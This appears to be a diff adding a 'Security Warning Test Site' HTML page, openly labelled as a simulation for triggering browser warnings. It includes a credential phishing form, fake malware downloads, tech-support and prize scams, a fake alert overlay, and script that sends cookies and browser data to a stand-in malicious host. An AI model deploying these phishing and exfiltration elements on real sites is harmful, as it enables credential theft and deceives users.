@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Warning Test Site</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: #ff0000;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #2a2a2a;
+            padding: 20px;
+            border: 2px solid #ff0000;
+            border-radius: 5px;
+        }
+        h1 {
+            color: #ff3333;
+            text-align: center;
+            text-shadow: 0 0 10px #ff0000;
+        }
+        .warning {
+            background-color: #800000;
+            color: #ffffff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border: 1px solid #ff0000;
+        }
+        .code-block {
+            background-color: #000000;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+        .button {
+            background-color: #ff0000;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .button:hover {
+            background-color: #cc0000;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚠️ SECURITY WARNING TEST SITE ⚠️</h1>
+        
+        <div class="warning">
+            <strong>WARNING:</strong> This website is intentionally designed to trigger security warnings in browsers. It contains elements that security systems typically flag as potentially malicious.
+        </div>
+
+        <h2>Malicious Elements Included:</h2>
+        <ul>
+            <li>Suspicious meta tags and content</li>
+            <li>Deceptive JavaScript code patterns</li>
+            <li>Phishing-like elements</li>
+            <li>Suspicious redirects and popups</li>
+            <li>Malware-like download prompts</li>
+        </ul>
+
+        <div class="code-block">
+// Suspicious JavaScript pattern
+function suspiciousActivity() {
+    // Attempt to access sensitive browser APIs
+    try {
+        navigator.geolocation.getCurrentPosition();
+        navigator.camera;
+        window.crypto.getRandomValues(new Uint32Array(10));
+        
+        // Deceptive redirect attempt
+        setTimeout(() => {
+            window.location.href = "http://suspicious-site.xyz/steal-data";
+        }, 3000);
+        
+        // Attempt to access clipboard
+        navigator.clipboard.readText();
+        
+        // Attempt to access local storage
+        localStorage.setItem("malicious_data", "tracking_info");
+        
+        // Attempt to access cookies
+        document.cookie = "tracking=malicious; path=/";
+        
+        // Suspicious console message
+        console.log("Attempting to access sensitive data...");
+        
+        // Deceptive alert
+        alert("WARNING: Your computer is infected! Click OK to clean.");
+        
+    } catch (error) {
+        console.error("Security error:", error);
+    }
+}
+
+// Auto-execute suspicious function
+window.onload = suspiciousActivity;
+        </div>
+
+        <div class="warning">
+            <strong>PHISHING ATTEMPT SIMULATION:</strong>
+            <p>Your account has been compromised! Enter your credentials immediately:</p>
+            <form action="http://malicious-site.com/steal-credentials" method="post">
+                <input type="text" placeholder="Username/Email" style="width: 100%; padding: 8px; margin: 5px 0;">
+                <input type="password" placeholder="Password" style="width: 100%; padding: 8px; margin: 5px 0;">
+                <button type="submit" class="button">Login to Secure Account</button>
+            </form>
+        </div>
+
+        <div class="warning">
+            <strong>MALWARE DOWNLOAD SIMULATION:</strong>
+            <p>Critical security update required! Download immediately:</p>
+            <a href="http://malicious-site.com/malware.exe" class="button">Download Security Update</a>
+            <a href="javascript:void(0)" onclick="alert('Downloading virus...')" class="button">Download Antivirus</a>
+        </div>
+
+        <div class="warning">
+            <strong>SUSPICIOUS POPUP SIMULATION:</strong>
+            <button onclick="window.open('http://malicious-site.com/popup', '_blank', 'width=300,height=200')" class="button">Open Popup</button>
+            <button onclick="alert('Your computer is infected with 5 viruses!')" class="button">Virus Alert</button>
+        </div>
+
+        <div class="code-block">
+// Additional suspicious code
+function trackUser() {
+    // Attempt to fingerprint the user
+    const fingerprint = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: document.cookie
+    };
+    
+    // Send to suspicious server
+    fetch('http://malicious-site.com/collect', {
+        method: 'POST',
+        body: JSON.stringify(fingerprint)
+    });
+}
+
+// Keylogger simulation
+document.addEventListener('keydown', function(e) {
+    console.log(`Key pressed: \${e.key}`);
+    // Send to malicious server
+});
+
+// Crypto mining simulation
+function mineCrypto() {
+    console.log("Starting crypto mining...");
+    // Intensive computation to simulate mining
+    while (true) {
+        Math.random() * Math.random();
+    }
+}
+
+// Auto-execute tracking
+trackUser();
+        </div>
+
+        <div class="warning">
+            <strong>SOCIAL ENGINEERING SIMULATION:</strong>
+            <p>You've won a $1,000,000 prize! Click here to claim:</p>
+            <a href="http://malicious-site.com/claim-prize" class="button">Claim Prize Now!</a>
+        </div>
+
+        <div class="warning">
+            <strong>TECH SUPPORT SCAM SIMULATION:</strong>
+            <p>Microsoft Warning: Your computer has been infected! Call tech support immediately:</p>
+            <p style="font-size: 24px; color: #ff0000; font-weight: bold;">1-800-MALWARE</p>
+            <button onclick="alert('Connecting to tech support...')" class="button">Call Now</button>
+        </div>
+
+        <div class="code-block">
+// Deceptive content injection
+function injectDeceptiveContent() {
+    const deceptiveDiv = document.createElement('div');
+    deceptiveDiv.innerHTML = `
+        <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); z-index: 9999;">
+            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: white; padding: 20px; border-radius: 5px;">
+                <h2>SECURITY ALERT</h2>
+                <p>Your computer is infected with viruses!</p>
+                <button onclick="window.location.href='http://malicious-site.com/clean'">Clean Now</button>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(deceptiveDiv);
+}
+
+// Auto-inject deceptive content
+setTimeout(injectDeceptiveContent, 5000);
+        </div>
+
+        <div class="warning">
+            <strong>WARNING:</strong> This page contains simulated malicious content for testing purposes only. Do not enter any real information or click any links if you value your security.
+        </div>
+    </div>
+
+    <script>
+        // Additional suspicious behaviors
+        console.log("Initializing malicious scripts...");
+        
+        // Attempt to access sensitive APIs
+        try {
+            navigator.geolocation.getCurrentPosition();
+            navigator.camera;
+            window.crypto.getRandomValues(new Uint32Array(10));
+        } catch (e) {
+            console.error("Security restriction:", e);
+        }
+        
+        // Deceptive alerts
+        setTimeout(() => {
+            alert("WARNING: Your computer is at risk!");
+        }, 2000);
+        
+        // Suspicious network requests
+        fetch('http://malicious-site.com/track', {
+            method: 'POST',
+            body: JSON.stringify({userAgent: navigator.userAgent})
+        });
+        
+        // Attempt to modify page content
+        document.title = "VIRUS ALERT - CLICK HERE";
+        
+        // Add suspicious meta tags
+        const meta1 = document.createElement('meta');
+        meta1.name = 'referrer';
+        meta1.content = 'unsafe-url';
+        document.head.appendChild(meta1);
+        
+        const meta2 = document.createElement('meta');
+        meta2.name = 'robots';
+        meta2.content = 'noindex, nofollow
